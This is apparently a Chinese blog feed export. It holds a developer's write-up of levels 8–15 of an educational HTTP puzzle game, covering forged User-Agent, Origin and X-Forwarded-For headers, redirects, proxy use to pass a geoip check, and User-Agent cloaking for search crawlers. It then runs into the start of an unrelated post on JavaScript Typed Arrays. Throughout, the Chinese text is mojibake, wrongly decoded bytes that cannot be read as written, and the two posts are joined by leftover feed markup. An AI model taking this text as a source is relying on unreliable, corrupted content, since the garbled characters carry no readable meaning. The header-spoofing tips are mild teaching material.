ç¬¬å…«é—œæˆ‘æ˜¨å¤©åœ¨æ•´ç†æ›¸ç±çš„æ™‚å€™ç™¼ç¾æœ‰ä¸€æœ¬æ›¸çš„ ISBN ç·¨è™Ÿè·Ÿç³»çµ±å…§çš„å°ä¸ä¸Šï¼Œä»”ç´°çœ‹äº†ä¸€ä¸‹ç™¼ç¾æˆ‘ç•¶æ™‚è¼¸å…¥ç³»çµ±æ™‚ key éŒ¯äº†ã€‚å“å‘€ï¼Œäººè€äº†å°±æ˜¯é€™æ¨£ï¼Œè€æ˜¯æœƒçœ‹éŒ¯ã€‚  é‚£æœ¬æ›¸çš„åå­—è£¡é¢æœ‰å€‹ã€Œæˆ‘ã€ï¼Œä½œè€…çš„åå­—æ˜¯å››å€‹å­—ï¼Œkey éŒ¯çš„ ISBN æœ€å¾Œä¸€ç¢¼ç‚º 7ï¼Œåªè¦æŠŠæœ€å¾Œä¸€ç¢¼æ”¹æˆ 3 å°±è¡Œäº†ã€‚å°äº†ï¼è¨˜å¾—è¦ç”¨æ–°çš„ç³»çµ±å–”ï¼ŒèˆŠçš„å·²ç¶“å®Œå…¨å»¢æ£„ä¸ç”¨äº†ã€‚

é€™é—œå°±è€ƒæ‰¾è³‡æ–™è·Ÿä¿®æ”¹è³‡æ–™è€Œå·²ï¼Œæ²’ä»€éº¼ç‰¹åˆ¥çš„ã€‚
ä¸‹ä¸€é—œä¹Ÿå°±æ˜¯ç¬¬ä¹é—œçš„ token æ˜¯NeuNï¼Œå¾·æ–‡ä¸­çš„ä¹ã€‚
ç¬¬ä¹é—œAPI æ–‡ä»¶è£¡é¢æœ‰å€‹ç²å–ç³»çµ±è³‡è¨Šçš„ endpoint ä½ è¨˜å¾—å—ï¼Ÿå·¥ç¨‹å¸«è·Ÿæˆ‘èªªé€™å€‹ç¶²å€ä¸å¤ªä¸€æ¨£ï¼Œç”¨ä¸€èˆ¬çš„æ–¹æ³•æ˜¯æ²’è¾¦æ³•æˆåŠŸæ‹¿åˆ°å›å‚³å€¼çš„ã€‚  æƒ³è¦å­˜å–çš„è©±è¦ç¬¦åˆå…©å€‹æ¢ä»¶ï¼š1. å¸¶ä¸Šä¸€å€‹ X-Library-Number çš„ headerï¼Œæˆ‘å€‘åœ–æ›¸é¤¨çš„ç·¨è™Ÿæ˜¯ 202. ä¼ºæœå™¨æœƒç”¨ user agent æª¢æŸ¥æ˜¯å¦æ˜¯å¾ IE6 é€å‡ºçš„ Requestï¼Œä¸æ˜¯çš„è©±æœƒæ“‹æ‰  é †åˆ©æ‹¿åˆ°ç³»çµ±è³‡è¨Šä¹‹å¾Œæ‡‰è©²æœƒæœ‰å€‹å«åš version çš„æ¬„ä½ï¼ŒæŠŠè£¡é¢çš„å€¼æ”¾åœ¨ query string çµ¦æˆ‘å§ã€‚

é€™é—œè€ƒå…©å€‹æ±è¥¿ï¼š

æœƒä¸æœƒå‚³ custom header
çŸ¥ä¸çŸ¥é“æ€éº¼æ”¹ user agentï¼Œä»¥åŠæ˜¯å¦çŸ¥é“ user agent ä»£è¡¨çš„æ„ç¾©

é€™å…©å€‹å°±æ˜¯å‰é¢æœ‰èªªéæˆ‘ä¸€å®šè¦æ”¾é€²ä¾†çš„å…ƒç´ ï¼Œå› ç‚ºæˆ‘è¦ºå¾—å¾ˆé‡è¦ã€‚
æˆ‘æƒ³è®“å­¸ç”Ÿå€‘çŸ¥é“èªª user agent å…¶å¯¦æœ‰æ»¿å¤šä½œç”¨ï¼Œå…¶ä¸­ä¸€å€‹å°±åŒ…å«è®“ server çŸ¥é“ä½ çš„ç€è¦½å™¨è·Ÿä½œæ¥­ç³»çµ±ä¹‹é¡çš„ï¼›ä¹Ÿæƒ³è®“ä»–å€‘çŸ¥é“é€™äº›æ±è¥¿éƒ½å¯ä»¥å½é€ ã€‚
åŸæœ¬å…¶å¯¦æ˜¯è¨­å®š Server æœƒæª¢æŸ¥æ˜¯ä¸æ˜¯å¾ Safari é€å‡ºçš„ Requestï¼Œä½†ç”¨ mac çš„äººå°±å¯ä»¥é–‹ Safari éé—œï¼Œå› æ­¤å¾Œä¾†æ‰æ”¹æˆç”¨ IE6ã€‚å¦‚æœä½ è¦å»è£ IE6 çš„ VM é‚£æˆ‘ä¹Ÿå°±ç®—äº†XD
ä¸‹ä¸€é—œçš„ token æ˜¯duZDsG3tvoAï¼Œå…¶å¯¦æ˜¯ YouTube çš„å½±ç‰‡ IDï¼Œå°æ‡‰åˆ°çš„æ˜¯å‘¨æ°å€«çš„åŠå³¶éµç›’ã€‚å› ç‚ºæˆ‘æ»¿å–œæ­¡é€™é¦–æ­Œï¼Œè€Œä¸”é€™é¦–æ­Œè·Ÿæ›¸ä¹Ÿæœ‰é»é—œä¿‚ã€‚
ç¬¬åé—œæ™‚é–“éå¾—çœŸå¿«å•Šï¼Œä»Šå¤©æ˜¯ä½ åœ¨é€™é‚Šå¹«å¿™çš„æœ€å¾Œä¸€å¤©äº†ã€‚  æˆ‘å€‘ä¾†ç©å€‹éŠæˆ²å§ï¼Ÿä½ æœ‰ç©éçŒœæ•¸å­—å—ï¼Ÿ  å‡ºé¡Œè€…æœƒå‡ºä¸€å€‹å››ä½æ•¸ä¸é‡è¤‡çš„æ•¸å­—ï¼Œä¾‹å¦‚èªª 9487ã€‚ä½ å¦‚æœçŒœ 9876ï¼Œæˆ‘æœƒè·Ÿä½ èªª 1A2Bï¼Œ1A ä»£è¡¨ 9 ä½ç½®å°æ•¸å­—ä¹Ÿå°ï¼Œ2B ä»£è¡¨ 8 è·Ÿ 7 ä½ çŒœå°äº†ä½†ä½ç½®éŒ¯äº†ã€‚  é–‹å§‹å§ï¼ŒæŠŠä½ è¦çŒœçš„æ•¸å­—æ”¾åœ¨ query string ç”¨ num ç•¶ä½œ key å‚³çµ¦æˆ‘ã€‚

åŸæœ¬æ˜¯æƒ³è®“å¤§å®¶çœŸçš„ä¾†ç©çŒœæ•¸å­—ï¼Œé è¨ˆçŒœå€‹äº”å…­æ¬¡å°±å¯ä»¥ç ´é—œã€‚ä½†åˆ¤æ–·é‚è¼¯æˆ‘æ²’å¯«å¥½ï¼Œæ‰€ä»¥ä½ å‚³ä¸€å€‹æ•¸å­—æˆ–æ˜¯é‡è¤‡æ•¸å­—æˆ‘éƒ½æ²’æ“‹æ‰ï¼Œæˆ–è€…æ˜¯ä½ è¦ç›´æ¥æš´åŠ›å˜—è©¦ 9999 ç¨®çµ„åˆä¹Ÿæ²’äººæ””ä½ ï¼Œæ‰€ä»¥é€™é¡Œçš„è§£æ³•å°±å¾ˆå¤šç¨®ã€‚
åˆ°é€™é‚Šç‚ºæ­¢ï¼Œå°±æ˜¯å‰åé—œçš„å…§å®¹ã€‚
ç¬¬ä¸€æ¬¡å„ªåŒ–åšå®Œå‰åé—œä¹‹å¾Œè®“ä¸€äº›æœ‹å‹å…ˆè©¦ç©ï¼Œå¾—åˆ°çš„åæ‡‰éƒ½é‚„ä¸éŒ¯ï¼Œä½†ä¹Ÿç™¼ç¾ä¸€äº›å•é¡Œï¼Œå…¶ä¸­æœ‰äº›æˆ‘ä¸Šé¢å·²ç¶“æéäº†ï¼Œä¾‹å¦‚èªªï¼š

ç¬¬ä¸€é—œèªªæ˜ä¸æ¸…æ¥šï¼Œä¸çŸ¥é“ name è¦å‚³åˆ°å“ªè£¡
æ²’æœ‰æç¤ºè¦ç”¨æ–°ç‰ˆ APIï¼Œä»¥ç‚ºå¯ä»¥ç”¨èˆŠçš„
å¦‚æœç€è¦½å™¨é‚£é—œé™åˆ¶ Safariï¼Œå° Mac ä½¿ç”¨è€…æ¯«ç„¡é›£åº¦

ä¸Šè¿°å•é¡ŒåŸºæœ¬ä¸Šéƒ½å¯ä»¥é€éåŠ å¼·æ–‡å­—æ•˜è¿°ä¾†æ”¹å–„ï¼Œä½†é‚„ç™¼ç¾ä¸€å€‹æ›´å¤§çš„å•é¡Œï¼š

å¡é—œ

é›–ç„¶èªªå¡é—œæ˜¯äººä¹‹å¸¸æƒ…ï¼Œä½†å…¶å¯¦æˆ‘ä¸å¸Œæœ›å¤§å®¶ä¸€ç›´å¡é—œã€‚ç•¢ç«Ÿé€™å€‹éŠæˆ²çš„æœ€çµ‚ç›®çš„å…¶å¯¦æ˜¯å­¸ç¿’ï¼Œå¥½ç©å°æˆ‘ä¾†èªªåªæ˜¯é™„åŠ åƒ¹å€¼ã€‚å¯æ˜¯æˆ‘åˆä¸èƒ½ç ´å£éŠæˆ²é«”é©—ï¼Œç›´æ¥è¬›è§£ç­”ï¼Œå› æ­¤æˆ‘å¿…é ˆæä¾›ä¸€å€‹æ–¹æ³•è®“ä»–å€‘å¯ä»¥çœ‹åˆ°æç¤ºã€‚
ä½ å¯èƒ½æœƒå•æˆ‘é‚£æç¤ºå¹¹å˜›ä¸ç”¨ç™½è‰²æ–‡å­—å°±å¥½ï¼Œé‚„è¦åŠ  &amp;hint=1 é€™éº¼éº»ç…©ã€‚ä½ å¯èƒ½å¿˜äº†ï¼Œæˆ‘é–‹é ­æœ‰èªªåˆè¡·æ˜¯æƒ³è®“ curl ä¹Ÿå¯ä»¥ç©é€™å€‹éŠæˆ²ï¼Œæ‰€ä»¥ç™½è‰²æ–‡å­—æ˜¯æ²’æœ‰ç”¨çš„ã€‚
ç¸½ä¹‹å‘¢ï¼Œæœ€å¾ŒåŠ ä¸Šäº†æç¤ºçš„åŠŸèƒ½ï¼Œè®“éŠæˆ²è®Šå¾—æ›´å®Œæ•´äº†ï¼Œé«”é©—ä¹Ÿè®Šå¾—æ›´å¥½ã€‚
åŸæœ¬éŠæˆ²å°±åˆ°é€™é‚ŠçµæŸäº†ï¼Œä½†å‰›å¥½æˆ‘åˆæœ‰äº†ä¸€äº›éˆæ„Ÿï¼Œæ‰€ä»¥ç¹¼çºŒå¾€ä¸‹åšäº†ä¸€äº›é—œå¡ï¼Œä¸‹é¢ä¾†è¬›è¬›é€²éšé—œå¡ã€‚
ç¬¬åä¸€é—œå˜¿ï¼å¾ˆé–‹å¿ƒçœ‹åˆ°ä½ é¡˜æ„å›ä¾†ç¹¼çºŒå¹«å¿™ï¼Œé€™æ¬¡æˆ‘å€‘æ¥åˆ°ä¸€å€‹æ–°çš„ä»»å‹™ï¼Œè¦è·Ÿåœ¨è²å¾‹è³“çš„ä¸€å€‹ä¸­æ–‡åœ–æ›¸é¤¨è³‡è¨Šç³»çµ±åšä¸²é€£é€™é‚Šæ˜¯ä»–å€‘çš„ API æ–‡ä»¶ï¼Œä½ ä¹‹å¾Œä¸€å®šæœƒç”¨åˆ°ã€‚  ç¾åœ¨å°±è®“æˆ‘å€‘å…ˆè·Ÿä»–å€‘æ‰“å€‹æ‹›å‘¼å§ï¼Œåªæ˜¯æˆ‘è¨˜å¾—ä»–å€‘çš„ API å¥½åƒæœƒé™åˆ¶ä¸€äº›æ±è¥¿å°±æ˜¯äº†...

é€™é—œæ˜¯é–‹é ­æ‰€æåˆ°çš„ï¼Œä¸€å®šè¦åšçš„ origin ç›¸é—œé—œå¡ã€‚æœƒæ”¾åœ¨é€²éšé—œæ˜¯å› ç‚ºæ€•å°æˆ‘å­¸ç”Ÿä¾†èªªæœ‰äº›å¤ªé›£ï¼Œæ‰€ä»¥æ‰æ”¾é€™è£¡ã€‚
ç¸½ä¹‹æ˜¯æƒ³è®“å¤§å®¶ç†è§£å°±ç®— Server æª¢æŸ¥ originï¼ŒClient ä¹Ÿå¯ä»¥è¼•æ˜“å½é€ ã€‚ç„¶å¾Œé€™è·Ÿç€è¦½å™¨çš„ CORS ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ï¼Œå¤§å®¶è¦å¾ˆæ¸…æ¥š Request å¾ç€è¦½å™¨ç™¼å‡ºä¾†ä»¥åŠè‡ªå·±ç™¼ Request æ˜¯å…©ä»¶å¾ˆä¸ä¸€æ¨£çš„äº‹ï¼Œå‰è€…æœƒæœ‰è¨±å¤šé™åˆ¶ï¼Œå¾Œè€…æ²’æœ‰ã€‚
ä¸‹ä¸€é—œçš„ tokenr3d1r3c7å…¶å¯¦æ˜¯ leet çš„redirectï¼Œå·²ç¶“æš—ç¤ºäº†ä¸‹ä¸€é—œçš„è§£æ³•ã€‚
ç¬¬åäºŒé—œæ‰“å®Œæ‹›å‘¼ä¹‹å¾Œæˆ‘å€‘è¦é–‹å§‹é€ä¸€äº›æ›¸éå»äº†ï¼Œä¸éå…¶å¯¦é‹é€æ²’æœ‰ä½ æƒ³åƒä¸­çš„ç°¡å–®ï¼Œä¸æ˜¯å–®ç´”çš„ A åˆ° B è€Œå·²è€Œæ˜¯åƒè½‰æ©Ÿé‚£æ¨£ï¼ŒA åˆ° Cï¼ŒC æ‰åˆ° Bï¼Œä¸­é–“æœƒç¶“éä¸€äº›è½‰é‹é»æ‰æœƒåˆ°é”ç›®çš„åœ°...ç®—äº†ï¼Œæˆ‘è·Ÿä½ èªªé‚£éº¼å¤šå¹¹å˜›  ç¾åœ¨è«‹ä½ å¹«æˆ‘æŠŠé‹é€è¦ç”¨çš„ token çµ¦æ‹¿å›ä¾†å§ï¼Œè¦æœ‰é€™å€‹ token æˆ‘å€‘æ‰èƒ½ç¹¼çºŒå¾€ä¸‹ä¸€æ­¥èµ°

é€™ä¸€é—œä¹Ÿæ˜¯å¾ŒæœŸæˆ‘å¾ˆæƒ³æ”¾çš„ä¸€é—œï¼Œè¦ºå¾—é€™æ¨£çš„æ¦‚å¿µæ»¿æœ‰è¶£çš„ã€‚é€éåœ¨ redirect éç¨‹çš„é€”ä¸­å¡æ±è¥¿ï¼Œå¼·è¿«å¤§å®¶å»ç†è§£ server side redirect çš„åŸç†æ˜¯ä»€éº¼ï¼ˆ301 è·Ÿ 302 status codeï¼‰ã€‚
è‹¥æ˜¯ä½ ä¸æ‡‚ç‚ºä»€éº¼å¯ä»¥è½‰å€ä»¥åŠè½‰å€èƒŒå¾Œçš„åŸç†ï¼Œä½ å°±è§£ä¸é–‹é€™é¡Œã€‚
ä¸‹ä¸€é—œçš„ token ç‚ºqspyzï¼Œå¾€å·¦å¹³ç§»ä¸€å€‹å­—å…ƒä¹‹å¾Œè®Šæˆproxyï¼Œä¸€æ¨£æš—ç¤ºè‘—ä¸‹ä¸€é—œçš„è§£æ³•ã€‚
ç¬¬åä¸‰é—œå¤ªå¥½äº†ï¼è‡ªå¾ä½ ä¸Šæ¬¡æŠŠé‹é€ç”¨çš„ token æ‹¿å›ä¾†ä»¥å¾Œï¼Œæˆ‘å€‘å°±å¯†åˆ‡åœ°èˆ‡è²å¾‹è³“åœ¨äº¤æ›æ›¸ç±å¯æ˜¯æœ€è¿‘ç¢°åˆ°äº†ä¸€äº›å°å•é¡Œï¼Œä¸çŸ¥é“ç‚ºä»€éº¼æœ‰æ™‚å€™æœƒå‚³é€å¤±æ•—æˆ‘è·Ÿä»–å€‘åæ˜ éå¾Œï¼Œä»–å€‘å«æˆ‘å€‘è‡ªå·±å»æ‹¿ log ä¾†çœ‹ï¼Œä½ å¯ä»¥å¹«æˆ‘å»çœ‹çœ‹å—ï¼Ÿå¾ç³»çµ±æ—¥èªŒè£¡é¢æ‡‰è©²å¯ä»¥æ‰¾åˆ°ä¸€äº›ç«¯å€ªã€‚

é€™é—œæ˜¯åœ¨è€ƒ proxy çš„ä½¿ç”¨ï¼Œå› ç‚º Server æœƒæª¢æŸ¥ä½¿ç”¨è€…çš„ IP æ˜¯å¦ä¾†è‡ªæ–¼è²å¾‹è³“ã€‚
æª¢æŸ¥çš„æ–¹æ³•æ˜¯ç”¨ node-geoipï¼š
advancedRouter.get(&#x27;/logs&#x27;, (req, res) =&gt; &#123;  const ip = req.ip || &#x27;&#x27;  const info = geoip.lookup(ip) || &#123;&#125;  if (info.country === &#x27;PH&#x27;) &#123;    res.end(text.lv13.reply)  &#125; else &#123;    res.end(text.lv13.wa)  &#125;&#125;)

æ‰€ä»¥åªè¦éš¨ä¾¿æ‰¾ä¸€å€‹åœ¨è²å¾‹è³“çš„ proxy ä¾†é€ request å°±å¯ä»¥éé—œäº†ã€‚
ä¸éé€™é—œæœ‰å…©ä»¶å‡ºä¹æ„æ–™çš„äº‹ï¼Œç¬¬ä¸€ä»¶äº‹æ˜¯æ»¿å¤šäººéƒ½æœƒå˜—è©¦å½é€ Accept-Languageé€™å€‹ headerï¼Œé€™æˆ‘ç•¶åˆå®Œå…¨æ²’æƒ³åˆ°ï¼ˆä¸éä¹Ÿæ²’ç”¨å°±æ˜¯äº†ï¼‰ã€‚
ç¬¬äºŒä»¶äº‹æ˜¯é€™é¡Œé‚„æœ‰å¦ä¸€å€‹è§£ç­”ï¼Œå°±æ˜¯å½é€ X-Forwarded-Forï¼Œé€™ä¹Ÿæ˜¯æˆ‘ç•¶åˆå®Œå…¨æ²’æƒ³åˆ°çš„äº‹ã€‚
æˆ‘åœ¨ Express è£¡é¢æœ‰é–‹app.set(&#39;trust proxy&#39;, true)ï¼Œæ‰€ä»¥åœ¨æ‹¿ä½¿ç”¨è€… IP çš„æ™‚å€™å¦‚æœæœ‰X-Forwarded-Foré€™å€‹ headerï¼Œæœƒä»¥é€™é‚Šçš„è³‡è¨Šç‚ºæº–ã€‚
å‰›å¥½å‰é™£å­è®€åˆ°ä¸€ç¯‡é¡ä¼¼çš„æ–‡ç« ï¼šåˆ©ç”¨X-Forwarded-Forä¼ªé€ å®¢æˆ·ç«¯IPæ¼æ´æˆå› åŠé˜²èŒƒã€‚
é›–ç„¶ä¸æ˜¯æˆ‘é è¨­çš„è§£æ³•ï¼Œä½†æˆ‘è¦ºå¾—é€™å€‹è§£æ³•æ›´æœ‰è¶£ï¼Œæ‰€ä»¥å°±æ²’æœ‰ç‰¹åœ°ä¿®æ‰äº†ã€‚
ç¬¬åå››é—œè·Ÿé‚£é‚Šçš„æºé€šå·®ä¸å¤šéƒ½æå®šäº†ï¼ŒçœŸæ˜¯å¤ªè¬è¬ä½ äº†ï¼Œé—œæ–¼é€™æ–¹é¢æ²’ä»€éº¼å•é¡Œäº†ï¼ä¸éæˆ‘è€å¤§æ˜¨å¤©çµ¦äº†æˆ‘ä¸€å€‹ä»»å‹™ï¼Œä»–å¸Œæœ›æˆ‘å»ç ”ç©¶é‚£é‚Šçš„é¦–é å…§å®¹åˆ°åº•æ˜¯æ€éº¼åšçš„ç‚ºä»€éº¼ç”¨ Google ä¸€æœå°‹é—œéµå­—å°±å¯ä»¥æ’åœ¨ç¬¬ä¸€é ï¼ŒçœŸæ˜¯å¤ªä¸åˆç†äº†  ä»–å€‘çš„ç¶²ç«™æ˜æ˜å°±ä»€éº¼éƒ½æ²’æœ‰ï¼Œæ€éº¼æœƒæ’åœ¨é‚£éº¼å‰é¢ï¼Ÿé›£é“èªªä»–å€‘å·å·å‹•äº†ä¸€äº›æ‰‹è…³ï¼Ÿè®“ Google æœå°‹å¼•æ“çœ‹åˆ°çš„å…§å®¹è·Ÿæˆ‘å€‘çœ‹åˆ°çš„ä¸ä¸€æ¨£ï¼Ÿ  ç®—äº†ï¼Œé‚„æ˜¯ä¸è¦ççŒœå¥½äº†ï¼Œä½ å¹«æˆ‘å€‘ç ”ç©¶ä¸€ä¸‹å§ï¼

é€™é—œæƒ³è®“å¤§å®¶çŸ¥é“çš„äº‹æƒ…æ˜¯ä¸åªç€è¦½å™¨ï¼Œå„å®¶çˆ¬èŸ²ä¹Ÿæœƒå¸¶ç‰¹å®šçš„ User-Agentï¼Œæ‰€ä»¥ Server ä¸€æ¨£å¯ä»¥é‡å°ä¸åŒçš„ UA ä¾†è¼¸å‡ºä¸åŒçš„è³‡è¨Šï¼ˆé›–ç„¶ä¸è¢«æ¨è–¦å°±æ˜¯äº†ï¼‰ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä¸€å€‹ SPA å¯ä»¥åªé‡å° Google æœå°‹å¼•æ“è·Ÿ Facebook å•Ÿç”¨ Server side render ä¾†è¼¸å‡ºå…§å®¹ï¼Œå°ä¸€èˆ¬ç”¨æˆ¶é‚„æ˜¯ Client side renderã€‚
æˆ–æ˜¯åƒ HTTP Challenge é€™å€‹ç¶²ç«™ï¼Œæœ¬èº«å°±æœ‰é‡å°ä¸åŒçš„ UA åšè™•ç†ï¼ˆå› ç‚ºç¶²ç«™éƒ½æ˜¯ç´”æ–‡å­—ï¼Œä½†æˆ‘å¸Œæœ›åœ¨è‡‰æ›¸ä¸Šè¢«åˆ†äº«æ™‚æœ‰è‡ªè¨‚æ¨™é¡Œè·Ÿæ•˜è¿°ï¼‰ï¼š
// base on UA return differect resultrouter.get(&#x27;/start&#x27;, (req, res) =&gt; &#123;  const UA = req.header(&#x27;User-Agent&#x27;) || &#x27;&#x27;  if (UA.indexOf(&#x27;facebookexternalhit&#x27;) &gt;= 0 || UA.indexOf(&#x27;Googlebot&#x27;) &gt;= 0 )&#123;    res.end(text.seo)  &#125; else &#123;    res.end(text.start.intro)  &#125;&#125;)

ä¸éå¥½åƒå¼„å¾—æ€ªæ€ªçš„ï¼Œä¸çŸ¥é“æœ‰æ²’æœ‰æˆåŠŸå°±æ˜¯äº†ã€‚
é€™å°±æ˜¯æœ€å¾Œä¸€é—œå›‰ï¼Œç¬¬åäº”é—œæ˜¯çµèªã€‚
ç¬¬äºŒæ¬¡å„ªåŒ–åšå®Œé€²éšé—œå¡ä¹‹å¾Œï¼Œæ•˜è¿°çš„éƒ¨åˆ†å…¶å¯¦ä¹Ÿæœ‰æ”¹ä¸€é»ï¼Œä¾‹å¦‚èªªç¬¬åå››é—œå°±æœ‰å­¸ç”Ÿä»¥ç‚ºè·Ÿ Chrome æœ‰é—œï¼ˆæƒ³åˆ° Google å°±åªæƒ³åˆ° Chrome XDï¼‰ï¼Œæ‰€ä»¥æˆ‘ç‰¹åœ°å¼·èª¿èªªã€ŒGoogle æœå°‹å¼•æ“ã€ï¼Œè¦å¾€é€™æ–¹å‘æ‰¾æ‰æ˜¯æ­£ç¢ºçš„ã€‚
è€Œå…¶ä¸­æœ€è®“æˆ‘é©šè¨çš„é‚„æ˜¯ç¬¬åä¸‰é—œé‚£å€‹æˆ‘æ²’æœ‰æƒ³åˆ°çš„è§£æ³•X-Forwarded-Forã€‚
åœ¨å°å¤–å…¬é–‹ä¹‹å¾Œï¼Œä¸€å€‹æœ‹å‹è·Ÿæˆ‘èªªæœ€å¾Œæ‡‰è©²æ”¾ä¸€å€‹ gist è®“å¤§å®¶ç•™è¨€ã€‚æˆ‘å…§å¿ƒä¸€é©šï¼šå°æ¬¸ï¼Œå¯ä»¥æ”¾ gistã€‚
å› ç‚ºæˆ‘åŸæœ¬å°±æœ‰æƒ³èªªè¦ä¸è¦æ”¾å€‹æ’è¡Œæ¦œæˆ–è€…æ˜¯ç•™è¨€æ¿ä¹‹é¡çš„ï¼Œè®“ç ´å®Œçš„äººå¯ä»¥ç•™å€‹è¨€ç•¶ä½œç´€å¿µï¼Œå¯æ˜¯è¦åšé€™åŠŸèƒ½æŒºéº»ç…©çš„ï¼Œæˆ‘æ‡¶å¾—åšã€‚è¢«æœ‹å‹æé†’æ‰çªç„¶ç™¼ç¾ gist æœ¬ä¾†å°±æœ‰å…§å»ºç•™è¨€åŠŸèƒ½ï¼Œé‚£å°±ç›´æ¥æ”¾ä¸€å€‹ gist å°±å¥½äº†ï¼
æ‰€ä»¥å‰æœŸç ´é—œçš„æœ‹å‹æ˜¯æ²’æœ‰ gist å¯ä»¥ç•™è¨€çš„ï¼Œæ˜¯åˆ°å¾Œé¢æ‰æ–°å¢çš„ã€‚
ç¸½çµé€™æ¬¡å¾ˆé–‹å¿ƒå¯ä»¥æŠŠé€™äº›çŸ¥è­˜åŒ…è£æˆæ¸¸æˆ²è·Ÿå¤§å®¶åˆ†äº«ï¼Œè¿´éŸ¿ä¼¼ä¹ä¹ŸæŒºä¸éŒ¯çš„ã€‚é›–ç„¶æœ‰äº›äººæœŸå¾…æœƒå†åŠ æ–°é—œå¡ï¼Œä½†æˆ‘ç›®å‰å®Œå…¨æ²’éˆæ„Ÿå°±æ˜¯äº†ã€‚
ä¹‹å¾Œæ¯”è¼ƒæœ‰å¯èƒ½çš„æ˜¯åšå€‹ HTMLã€CSS è·Ÿ JavaScript çš„ç‰ˆæœ¬ï¼Œé¡å‹å·®ä¸å¤šï¼Œä½†å°±æ˜¯æ¯é—œçš„è§£æ³•è·ŸçŸ¥è­˜é»ä¸ä¸€æ¨£ï¼Œåˆ°æ™‚å€™å†ä¾†è·Ÿå¤§å®¶åˆ†äº«ã€‚
æ„Ÿè¬æ—©æœŸå¹«æˆ‘æ¸¬è©¦çš„æœ‹å‹å€‘ï¼Œä¹Ÿæ„Ÿè¬è·Ÿæˆ‘ä¸€èµ·äº«å—éŠæˆ²çš„å¤§å®¶ã€‚åº•ä¸‹æ˜¯ä¸€äº›ç›¸é—œçš„é—–é—œå¿ƒå¾—ï¼Œæœ‰èˆˆè¶£çš„è©±ä¹Ÿå¯ä»¥çœ‹çœ‹ï¼š

ä¸€æ—¥åœ–æ›¸é¤¨ç®¡ç†å“¡ï¼šHTTP Challenge
HTTP_Gameæ”»ç•¥(ä¸€)
Lidemy HTTP åœ–æ›¸é¤¨å°å¼ŸåŠ ç­(V2)
å°æŒ‘æˆ° http game è§£é¡Œæ€è·¯å¿ƒå¾—æƒ³æ³•

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ JavaScript è™•ç†äºŒé€²ä½è³‡æ–™</title>
    <url>/2017/09/24/binary-data-manipulations-in-javascript/</url>
    <content><![CDATA[ç”±æ–¼é«˜åº¦å°è£èˆ‡æŠ½è±¡ï¼ŒJavaScript çš„åŸ·è¡Œæ•ˆç‡æ¯”ä¸ä¸Š C çš„èªè¨€ã€‚ä¾‹å¦‚ JavaScript çš„ Array ä¸‹æ¨™ï¼ˆsubscriptï¼‰æ˜¯æ ¹æ“š hash key è€Œéå¯¦é«”è¨˜æ†¶é«”ä½å€ offset å–å€¼ï¼Œé›–ç„¶æ–¹ä¾¿ï¼Œå»å¤šäº†æ•ˆèƒ½é–‹éŠ·ã€‚ç•¶ Canvasã€WebGLã€WebVR é–‹å§‹èµ°ç´…ï¼Œæ•ˆèƒ½è¶Šä¾†è¶Šå—é‡è¦–ï¼Œå¦‚ä½•è®“ JavaScript é”åˆ°å¦‚åŒ C æŒ‡æ¨™èˆ¬æ“ä½œ binary data è®Šå¾—è‡³é—œé‡è¦ã€‚
å­˜åœ¨è¨±ä¹…ä½†æœ€è¿‘æ‰è®Šç‚º ES6 æ¨™æº–ã€ŒTyped Arrayã€å°±æ˜¯è§£æ”¾ JavaScript æ“ä½œ binary data èƒ½åŠ›çš„å¥½å·¥å…·ï¼ä¸€èµ·ä¾†äº†è§£ Typed Array å§ï¼
ï¼ˆåŸºæ–¼ ECMAScript 6+ï¼ŒNode.js 8.3ï¼‰


Buffer v.s ViewES6 å¼•å…¥çš„ Typed Array å®¶æ—ï¼Œå¯ä»¥åˆ†ç‚ºå…©å¤§é¡ï¼šBuffer èˆ‡ Viewã€‚
æ‰€è¬‚ Buffer æ˜¯ä¸€å€‹æŒ‡å‘å„²å­˜è³‡æ–™çš„è¨˜æ†¶é«”å€å¡Šä¹‹ç‰©ä»¶ï¼Œé¡ä¼¼æ–¼ malloc é…ç½®å‡ºä¾†çš„ç©ºé–“ï¼Œç„¡æ³•ç›´æ¥å­˜å–æˆ–ä¿®æ”¹ buffer å…§éƒ¨çš„è³‡æ–™ï¼Œåœ¨ JavaScript ä¸­ Buffer çš„å¯¦ä½œå°±æ˜¯ ArrayBufferã€‚
å¦‚æœæˆ‘å€‘æƒ³å­˜å–æŸäº› buffer åº•ä¸‹çš„å…§å®¹ï¼Œæˆ‘å€‘éœ€è¦ Viewï¼ˆè¦–åœ–ï¼‰ï¼Œé€éå®£å‘Šä¸åŒè³‡æ–™å‹åˆ¥çš„ viewï¼Œé›»è…¦å°±æœƒäº†è§£å¦‚ä½•æ“ä½œé€™æ®µ data chunkï¼Œè©²ç•¶ä½œ float32 è®€å–å‘¢ï¼ŸæŠ‘æˆ–ä»¥ unsigned integer ä¾†æ“ä½œã€‚
ES6 è¦ç¯„äº†ä¸‰å€‹ Typed Array ç›¸é—œç‰©ä»¶ï¼Œå°æ‡‰é¡åˆ¥å¦‚ä¸‹ï¼š

ArrayBufferï¼šBufferï¼Œä»£è¡¨ä¸€æ®µè¨˜æ†¶é«”å€å¡Šï¼Œåƒ…èƒ½é€é View æ“ä½œå…¶å…§å®¹ã€‚
TypedArrayï¼šViewï¼Œå„²å­˜å›ºå®šå‹åˆ¥è³‡æ–™çš„ Arrayï¼Œä¾‹å¦‚ Uint8Arrayï¼ˆ8-bit unsigned integerï¼‰ã€Float64Arrayï¼ˆ64-bit IEEE floating point number)ã€‚
DataViewï¼šViewï¼Œä¸é™åˆ¶å‹åˆ¥ï¼Œå¯è‡ªå®šç¾©å¾å“ªå€‹ byteï¼Œä»¥ä»€éº¼å‹åˆ¥ï¼Œç”¨å“ªç¨® byte orderï¼ˆendianï¼‰å­˜å–ã€‚

